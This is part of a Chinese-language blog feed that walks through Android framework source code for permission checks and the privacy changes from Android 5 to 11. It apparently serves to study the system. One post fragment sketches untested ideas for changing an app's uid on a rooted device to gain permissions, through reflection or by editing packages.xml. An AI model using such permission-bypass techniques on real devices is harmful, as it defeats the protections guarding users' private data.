user)</span> <span class="keyword">throws</span> PackageManagerException </span>&#123;</span><br><span class="line">    ......</span><br><span class="line"><span class="number">6591</span>        SharedUserSetting suid = <span class="keyword">null</span>;</span><br><span class="line"><span class="number">6592</span>        PackageSetting pkgSetting = <span class="keyword">null</span>;</span><br><span class="line">    ......</span><br><span class="line"><span class="number">6672</span>            <span class="comment">// Just create the setting, don't add it yet. For already existing packages</span></span><br><span class="line"><span class="number">6673</span>            <span class="comment">// the PkgSetting exists already and doesn't have to be created.</span></span><br><span class="line"><span class="number">6674</span>            pkgSetting = mSettings.getPackageLPw(pkg, origPackage, realName, suid, destCodeFile,</span><br><span class="line"><span class="number">6675</span>                    destResourceFile, pkg.applicationInfo.nativeLibraryRootDir,</span><br><span class="line"><span class="number">6676</span>                    pkg.applicationInfo.primaryCpuAbi,</span><br><span class="line"><span class="number">6677</span>                    pkg.applicationInfo.secondaryCpuAbi,</span><br><span class="line"><span class="number">6678</span>                    pkg.applicationInfo.flags, pkg.applicationInfo.privateFlags,</span><br><span class="line"><span class="number">6679</span>                    user, <span class="keyword">false</span>);</span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>app包解析完，配置都获取到之后，就该写文件了，回到<code>PackageManagerService</code>构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2288</span>            updatePermissionsLPw(<span class="keyword">null</span>, <span class="keyword">null</span>, StorageManager.UUID_PRIVATE_INTERNAL, updateFlags);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8244</span>    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">updatePermissionsLPw</span><span class="params">(String changingPkg, PackageParser.Package pkgInfo,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">8245</span>            <span class="keyword">int</span> flags)</span> </span>&#123;</span><br><span class="line"><span class="number">8246</span>        <span class="keyword">final</span> String volumeUuid = (pkgInfo != <span class="keyword">null</span>) ? getVolumeUuidForPackage(pkgInfo) : <span class="keyword">null</span>;</span><br><span class="line"><span class="number">8247</span>        updatePermissionsLPw(changingPkg, pkgInfo, volumeUuid, flags);</span><br><span class="line"><span class="number">8248</span>    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8250</span>    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">updatePermissionsLPw</span><span class="params">(String changingPkg,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">8251</span>            PackageParser.Package pkgInfo, String replaceVolumeUuid, <span class="keyword">int</span> flags)</span> </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="number">8315</span>        <span class="comment">// Now update the permissions for all packages, in particular</span></span><br><span class="line"><span class="number">8316</span>        <span class="comment">// replace the granted permissions of the system packages.</span></span><br><span class="line"><span class="number">8317</span>        <span class="keyword">if</span> ((flags&amp;UPDATE_PERMISSIONS_ALL) != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">8318</span>            <span class="keyword">for</span> (PackageParser.Package pkg : mPackages.values()) &#123;</span><br><span class="line"><span class="number">8319</span>                <span class="keyword">if</span> (pkg != pkgInfo) &#123;</span><br><span class="line"><span class="number">8320</span>                    <span class="comment">// Only replace for packages on requested volume</span></span><br><span class="line"><span class="number">8321</span>                    <span class="keyword">final</span> String volumeUuid = getVolumeUuidForPackage(pkg);</span><br><span class="line"><span class="number">8322</span>                    <span class="keyword">final</span> <span class="keyword">boolean</span> replace = ((flags &amp; UPDATE_PERMISSIONS_REPLACE_ALL) != <span class="number">0</span>)</span><br><span class="line"><span class="number">8323</span>                            &amp;&amp; Objects.equals(replaceVolumeUuid, volumeUuid);</span><br><span class="line"><span class="number">8324</span>                    grantPermissionsLPw(pkg, replace, changingPkg);</span><br><span class="line"><span class="number">8325</span>                &#125;</span><br><span class="line"><span class="number">8326</span>            &#125;</span><br><span class="line"><span class="number">8327</span>        &#125;</span><br><span class="line"><span class="number">8328</span></span><br><span class="line"><span class="number">8329</span>        <span class="keyword">if</span> (pkgInfo != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="number">8330</span>            <span class="comment">// Only replace for packages on requested volume</span></span><br><span class="line"><span class="number">8331</span>            <span class="keyword">final</span> String volumeUuid = getVolumeUuidForPackage(pkgInfo);</span><br><span class="line"><span class="number">8332</span>            <span class="keyword">final</span> <span class="keyword">boolean</span> replace = ((flags &amp; UPDATE_PERMISSIONS_REPLACE_PKG) != <span class="number">0</span>)</span><br><span class="line"><span class="number">8333</span>                    &amp;&amp; Objects.equals(replaceVolumeUuid, volumeUuid);</span><br><span class="line"><span class="number">8334</span>            grantPermissionsLPw(pkgInfo, replace, changingPkg);</span><br><span class="line"><span class="number">8335</span>        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>grantPermissionsLPw</code>, 经过一系列解析最终调用:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8600</span>        <span class="keyword">for</span> (<span class="keyword">int</span> userId : changedRuntimePermissionUserIds) &#123;</span><br><span class="line"><span class="number">8601</span>            mSettings.writeRuntimePermissionsForUserLPr(userId, runtimePermissionsRevoked);</span><br><span class="line"><span class="number">8602</span>        &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5232</span>    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeRuntimePermissionsForUserLPr</span><span class="params">(<span class="keyword">int</span> userId, <span class="keyword">boolean</span> sync)</span> </span>&#123;</span><br><span class="line"><span class="number">5233</span>        <span class="keyword">if</span> (sync) &#123;</span><br><span class="line"><span class="number">5234</span>            mRuntimePermissionsPersistence.writePermissionsForUserSyncLPr(userId);</span><br><span class="line"><span class="number">5235</span>        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">5236</span>            mRuntimePermissionsPersistence.writePermissionsForUserAsyncLPr(userId);</span><br><span class="line"><span class="number">5237</span>        &#125;</span><br><span class="line"><span class="number">5238</span>    &#125;</span><br></pre></td></tr></table></figure><p>那么，修改app的uid的方法考虑两种方案：</p><p>（1）反射调用<code>writeRuntimePermissionsForUserLPr</code>,参数简单容易构造；</p><p>（2）修改最终写入的uid，packages.xml</p><p>目前还未实践出结果。</p><p>欲知后事如何，且听下回分解。</p><p><strong>引用文献：</strong></p><p>【1】<a href="https://blog.csdn.net/u014418171/article/details/103868878?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160930023616780302911830%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&amp;request_id=160930023616780302911830&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-103868878.first_rank_v2_pc_rank_v29&amp;utm_term=Android%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BD%BF%E7%94%A8root%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B%E6%9C%BA%E5%88%B6,%E5%BC%BA%E8%A1%8C%E8%87%AA%E5%8A%A8%E5%85%81%E8%AE%B8%E5%BA%94%E7%94%A8%E7%9A%84%E6%82%AC%E6%B5%AE%E7%AA%97/%E5%BA%94%E7%94%A8%E5%90%8E%E5%8F%B0%E5%BC%B9%E5%87%BA%E7%95%8C%E9%9D%A2%E7%AD%89%E6%9D%83%E9%99%90" target="_blank" rel="noopener">https://blog.csdn.net/u014418171/article/details/103868878?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160930023616780302911830%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&amp;request_id=160930023616780302911830&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-103868878.first_rank_v2_pc_rank_v29&amp;utm_term=Android%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BD%BF%E7%94%A8root%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B%E6%9C%BA%E5%88%B6,%E5%BC%BA%E8%A1%8C%E8%87%AA%E5%8A%A8%E5%85%81%E8%AE%B8%E5%BA%94%E7%94%A8%E7%9A%84%E6%82%AC%E6%B5%AE%E7%AA%97/%E5%BA%94%E7%94%A8%E5%90%8E%E5%8F%B0%E5%BC%B9%E5%87%BA%E7%95%8C%E9%9D%A2%E7%AD%89%E6%9D%83%E9%99%90</a></p><p>【2】<a href="https://blog.csdn.net/zhangyongfeiyong/article/details/52292347" target="_blank" rel="noopener">https://blog.csdn.net/zhangyongfeiyong/article/details/52292347</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;*郑重声明：本文内容只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;设备&lt;/em&gt;：&lt;strong&gt;root&lt;/strong&gt;过的Android7.1&lt;/p&gt;
&lt;p&gt;在&lt;a href=&quot;https:
      
    
    </summary>
    
    
      <category term="Android源码分析" scheme="http://yoursite.com/categories/Android%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Android应用权限控制源码分析</title>
    <link href="http://yoursite.com/2020/12/21/Android%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/12/21/Android%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-12-21T01:29:52.000Z</published>
    <updated>2020-12-24T07:22:21.411Z</updated>
    
    <content type="html"><![CDATA[<p><strong>*郑重声明：本文内容只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。</strong></p><p>Android权限控制是对应用访问设备信息和接口的限制，其作用是保护Android用户的隐私。</p><blockquote><p>Android安全架构的设计主旨是：在默认情况下，任何应用都没有权限执行会对其他应用、操作系统或用户带来不利影响的任何操作。</p></blockquote><p>对于第三方应用来说，权限分为三个保护级别：普通、签名和危险。</p><ul><li>普通权限：应用需要访问自身沙盒之外的数据或资源，但对用户隐私或其他应用带来的风险很小，如设置时区、壁纸、闹钟；</li><li>签名权限：用于两个签名相同的应用间进行安全的数据共享；</li><li>危险权限：应用需要的数据或资源设计用户隐私，或者可能对用户存储的数据或其他应用的操作产生影响，如读取联系人，拍照、定位等。</li></ul><h2 id="系统对用户隐私保护的演进"><a href="#系统对用户隐私保护的演进" class="headerlink" title="系统对用户隐私保护的演进"></a>系统对用户隐私保护的演进</h2><p>不论系统如何更新，应用申请权限首要的一部一直没变，就是在<code>AndroidManifest.xml</code>中进行注册，如下图：</p><p><img src="AndroidManifest.png" alt=""></p><p>而在用户主动管理权限的部分，Android正在日益完善，分水岭是在Android 6.0。</p><h4 id="Android-6"><a href="#Android-6" class="headerlink" title="Android 6"></a>Android 6</h4><p>在Android6.0发布之前，应用申请权限只需在AndroidManifest文件中列举出来即可，在应用安装时会一一列举出来，但是用户并不能选择“允许”或“禁止”，甚至应用安装后，在“设置”中也仅仅能看到应用申请了哪些权限，用户并不能做任何修改。下图为Android5.0系统应用安装时和安装完成后的权限管理情况：</p><p><img src="Android5_install.png" alt=""></p><p><img src="Android5.png" alt=""></p><p>在这一阶段，用户的隐私并不属于用户自己，全凭第三方应用开发者做主，“人为刀俎，我为鱼肉”。好在国内一些手机厂商深度定制的ROM（如MIUI等）在Android 6.0之前就加入了权限管理功能。</p><p>Google在Android 6.0中推出了新的运行时权限管理机制。应用安装时不再直接授予应用危险权限，而是在应用启动时需要通过弹框的方式向用户请求。</p><p><img src="580c7ea1d97a1c75c48e55dcec489e9f_720w.png" alt=""></p><p>“道高一尺魔高一丈”，这一时期也出现了许多用户拒绝权限，应用就直接退出的操作，如支付宝、微博、淘宝等。而微信等一批应用就很“机智”了，编译APP时的<code>targetSdkVersion</code>属性直接设置为22（即Android5.1），应用安装上就直接授予了权限，大多数用户并不会手动去“设置”中关闭权限。</p><h4 id="Android-7"><a href="#Android-7" class="headerlink" title="Android 7"></a>Android 7</h4><p>Android 7增加了“私有目录限制访问”和“StrictMode API政策”两个权限限制，私有文件的权限放宽会触发SecurityException，应用间分享私有文件也应该使用FileProvider，而不是像之前一样直接发送<code>file://</code>URI。</p><h4 id="Android-8"><a href="#Android-8" class="headerlink" title="Android 8"></a>Android 8</h4><p>Android 8之前，应用被授予某权限，系统会将授予该权限同一权限组的所有权限（Manifest中申请的）。比如，用户授予了读短信的权限，则与之同组的发送短信、接收短信等权限都会一同授予，这显然是不合理的。Android8纠正了这一点，但是并不彻底。如果用户同意了读短信的权限申请，那么后续应用申请发送短信的权限时，系统将直接授予该权限，不会再提示用户同意。</p><h4 id="Android-9"><a href="#Android-9" class="headerlink" title="Android 9"></a>Android 9</h4><p>Android 9为了增强用户隐私保护增加了若干限制。比如，限制后台应用访问设备传感器，限制通过WiFi扫描检索到的信息，修改了通话、手机状态（READ_PHONE_STATE）和WiFi扫描的新权限规则。</p><ul><li>应用访问麦克风、摄像头、位置等需要前台服务</li><li>将读/写通话日志，处理呼出电话等权限分配一个新的权限组CALL_LOG</li><li>限制访问电话号码：READ_CALL_LOG权限</li><li>通过WiFi广播不再能获取到SSID、BSSID(Wifi名和路由器MAC)，想要获取SSID和BSSID需要位置权限和ACCESS_WIFI_STATE权限</li></ul><h4 id="Android-10"><a href="#Android-10" class="headerlink" title="Android 10"></a>Android 10</h4><p>Android 10提供了更加严格的隐私保护：</p><ul><li><p>用户授予位置权限时多了一种选择，即仅在应用实际使用时访问位置；</p><p><img src="location.png" alt=""></p></li><li><p>应用无法访问设备不可重置的标识符，如IMEI、序列号等。设备MAC地址也会默认在连接到WLAN时随机分配。</p></li><li><p>阻止应用从后台启动，若要通过Service唤醒ACtivity，需要将Service设置为前台服务</p></li><li><p>文件分区存储，应用只能访问自己目录下的文件和公共媒体文件，<code>/storage/emulated/0/Android/data/包名/files</code>和<code>/storage/emulated/0/Downloads(Pictures)</code></p></li></ul><h4 id="Android-11"><a href="#Android-11" class="headerlink" title="Android 11"></a>Android 11</h4><p>Android 11的几项重大变更：</p><ul><li>TargetSDK为Android 11的应用，强制执行分区存储机制；</li><li>对位置、麦克风和摄像头权限进行单次授权；</li><li>已经授予权限的应用，若用户几个月未使用，自动重置权限；</li><li>在前台服务中申请摄像头、麦克风等权限时，需要声明camera和microphone前台服务类型；</li><li>应用对设备上安装的其他应用的可见性可以在Manifest中添加<code>queries</code>元素进行配置，告知系统本应用对哪些应用可见。</li></ul><p>各版本更新情况：</p><p><a href="https://developer.android.google.cn/about/versions/11" target="_blank" rel="noopener">https://developer.android.google.cn/about/versions/11</a></p><h2 id="权限控制源码分析"><a href="#权限控制源码分析" class="headerlink" title="权限控制源码分析"></a>权限控制源码分析</h2><h4 id="Android-5-1"><a href="#Android-5-1" class="headerlink" title="Android 5.1"></a>Android 5.1</h4><p>Android5.1以下的系统不需要弹框申请权限，但有时为了防止抛异常，需要检查该权限是否被授予，检查权限调用了<code>Context</code>类的<code>checkPermission</code>方法，传入参数为permission，pid, uid。</p><p>具体实现在：<code>/framework/base/core/jaca/android/app/ContextImpl.java</code>.</p><p><a href="http://androidxref.com/5.1.1_r6/xref/frameworks/base/core/java/android/app/ContextImpl.java" target="_blank" rel="noopener">http://androidxref.com/5.1.1_r6/xref/frameworks/base/core/java/android/app/ContextImpl.java</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">checkPermission</span><span class="params">(String permission, <span class="keyword">int</span> pid, <span class="keyword">int</span> uid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (permission == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"permission is null"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ActivityManagerNative.getDefault().checkPermission(</span><br><span class="line">                permission, pid, uid);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> PackageManager.PERMISSION_DENIED;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ActivityManagerNative.getDefault()</code>方法的返回值为<code>IActivityManager</code>类型，该类是一个接口，其实现类<code>ActivityManagerService</code>中的<code>checkPermission()</code>:</p><p><a href="http://androidxref.com/5.1.1_r6/xref/frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java" target="_blank" rel="noopener">http://androidxref.com/5.1.1_r6/xref/frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">checkPermission</span><span class="params">(String permission, <span class="keyword">int</span> pid, <span class="keyword">int</span> uid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (permission == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> PackageManager.PERMISSION_DENIED;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> checkComponentPermission(permission, pid, UserHandle.getAppId(uid), -<span class="number">1</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入<code>checkComponentPermission()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">checkComponentPermission</span><span class="params">(String permission, <span class="keyword">int</span> pid, <span class="keyword">int</span> uid,</span></span></span><br><span class="line"><span class="function"><span class="params">         <span class="keyword">int</span> owningUid, <span class="keyword">boolean</span> exported)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (pid == MY_PID) &#123;</span><br><span class="line">         <span class="keyword">return</span> PackageManager.PERMISSION_GRANTED;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> ActivityManager.checkComponentPermission(permission, uid,</span><br><span class="line">             owningUid, exported);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>进入<code>ActivityManager.checkComponentPermission</code>:</p><p><a href="http://androidxref.com/5.1.1_r6/xref/frameworks/base/core/java/android/app/ActivityManager.java" target="_blank" rel="noopener">http://androidxref.com/5.1.1_r6/xref/frameworks/base/core/java/android/app/ActivityManager.java</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">checkComponentPermission</span><span class="params">(String permission, <span class="keyword">int</span> uid,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">int</span> owningUid, <span class="keyword">boolean</span> exported)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Root, system server get to do everything.</span></span><br><span class="line">        <span class="keyword">if</span> (uid == <span class="number">0</span> || uid == Process.SYSTEM_UID) &#123;</span><br><span class="line">            <span class="keyword">return</span> PackageManager.PERMISSION_GRANTED;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Isolated processes don't get any permissions.</span></span><br><span class="line">        <span class="keyword">if</span> (UserHandle.isIsolated(uid)) &#123;</span><br><span class="line">            <span class="keyword">return</span> PackageManager.PERMISSION_DENIED;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// If there is a uid that owns whatever is being accessed, it has</span></span><br><span class="line">        <span class="comment">// blanket access to it regardless of the permissions it requires.</span></span><br><span class="line">        <span class="keyword">if</span> (owningUid &gt;= <span class="number">0</span> &amp;&amp; UserHandle.isSameApp(uid, owningUid)) &#123;</span><br><span class="line">            <span class="keyword">return</span> PackageManager.PERMISSION_GRANTED;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// If the target is not exported, then nobody else can get to it.</span></span><br><span class="line">        <span class="keyword">if</span> (!exported) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            RuntimeException here = new RuntimeException("here");</span></span><br><span class="line"><span class="comment">            here.fillInStackTrace();</span></span><br><span class="line"><span class="comment">            Slog.w(TAG, "Permission denied: checkComponentPermission() owningUid=" + owningUid,</span></span><br><span class="line"><span class="comment">                    here);</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="keyword">return</span> PackageManager.PERMISSION_DENIED;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (permission == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> PackageManager.PERMISSION_GRANTED;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> AppGlobals.getPackageManager()</span><br><span class="line">                    .checkUidPermission(permission, uid);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            <span class="comment">// Should never happen, but if it does... deny!</span></span><br><span class="line">            Slog.e(TAG, <span class="string">"PackageManager is dead?!?"</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> PackageManager.PERMISSION_DENIED;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>普通应用的权限申请会进入最后一个分支：<code>AppGlobals.getPackageManager()                    .checkUidPermission(permission, uid);</code></p><p>进入<code>AppGlobals.getPackageManager()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IPackageManager <span class="title">getPackageManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ActivityThread.getPackageManager();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ActivityThread.getPackageManager()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IPackageManager <span class="title">getPackageManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (sPackageManager != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//Slog.v("PackageManager", "returning cur default = " + sPackageManager);</span></span><br><span class="line">        <span class="keyword">return</span> sPackageManager;</span><br><span class="line">    &#125;</span><br><span class="line">    IBinder b = ServiceManager.getService(<span class="string">"package"</span>);</span><br><span class="line">    <span class="comment">//Slog.v("PackageManager", "default service binder = " + b);</span></span><br><span class="line">    sPackageManager = IPackageManager.Stub.asInterface(b);</span><br><span class="line">    <span class="comment">//Slog.v("PackageManager", "default service = " + sPackageManager);</span></span><br><span class="line">    <span class="keyword">return</span> sPackageManager;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里涉及到进程间通信，在ServiceManager中找到注册的“package”服务，并返回PackageManagerService。PackageManagerService继承了IPackageManager.Stub, IPackageManager.Stub继承了Binder,并实现了IpackageManager。</p><p>（与前面ActivityManagerService类似，AMS继承了ActivityManagerNative, AMN继承了binder, 并实现了IActivityManager）</p><p>接下来进入<code>PackageManagerService.checkUidPermission</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2390</span>    <span class="meta">@Override</span></span><br><span class="line"><span class="number">2391</span>    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">checkUidPermission</span><span class="params">(String permName, <span class="keyword">int</span> uid)</span> </span>&#123;</span><br><span class="line"><span class="number">2392</span>        <span class="keyword">synchronized</span> (mPackages) &#123;</span><br><span class="line"><span class="number">2393</span>            Object obj = mSettings.getUserIdLPr(UserHandle.getAppId(uid));</span><br><span class="line"><span class="number">2394</span>            <span class="keyword">if</span> (obj != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="number">2395</span>                GrantedPermissions gp = (GrantedPermissions)obj;</span><br><span class="line"><span class="number">2396</span>                <span class="keyword">if</span> (gp.grantedPermissions.contains(permName)) &#123;</span><br><span class="line"><span class="number">2397</span>                    <span class="keyword">return</span> PackageManager.PERMISSION_GRANTED;</span><br><span class="line"><span class="number">2398</span>                &#125;</span><br><span class="line"><span class="number">2399</span>            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">2400</span>                ArraySet&lt;String&gt; perms = mSystemPermissions.get(uid);</span><br><span class="line"><span class="number">2401</span>                <span class="keyword">if</span> (perms != <span class="keyword">null</span> &amp;&amp; perms.contains(permName)) &#123;</span><br><span class="line"><span class="number">2402</span>                    <span class="keyword">return</span> PackageManager.PERMISSION_GRANTED;</span><br><span class="line"><span class="number">2403</span>                &#125;</span><br><span class="line"><span class="number">2404</span>            &#125;</span><br><span class="line"><span class="number">2405</span>        &#125;</span><br><span class="line"><span class="number">2406</span>        <span class="keyword">return</span> PackageManager.PERMISSION_DENIED;</span><br><span class="line"><span class="number">2407</span>    &#125;</span><br></pre></td></tr></table></figure><p>mSettings是Setting类的对象，保存了动态设置。</p><p><code>Object obj = mSettings.getUserIdLPr(UserHandle.getAppId(uid));</code>即为获取某uid对应设置。<code>GrantedPermission.grantedPermissions</code>是一个ArraySet，保存了已授予的权限。</p><p>另一个分支，<code>mSystemPermissions = SystemConfig.getSystemPermissions()</code>，获取系统全局配置。<code>mSystemPermissions.get(uid)</code>即获取系统全局配置中，本应用已授予的权限。</p><p>SystemConfig类初始化时，就会去读取<code>/etc/sysconfig</code>,<code>/etc/permissions</code>下的platform.xml文件，此文件保存了所有已安装应用注册的权限，经过解析保存在`mSystemPermissions中。</p><p>至此，检查是否已授予某权限完成，返回<code>PackageManager.PERMISSION_GRANTED = 0</code>或<code>PackageManager.PERMISSION_DENIED = -1</code>。</p><h4 id="Android-6-1"><a href="#Android-6-1" class="headerlink" title="Android 6"></a>Android 6</h4><p>Android6及以上版本的系统，在使用危险权限的接口时必须加入检查权限的代码。以申请位置权限为例，需要先检查是否已被授予，如果没有再请求该权限：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 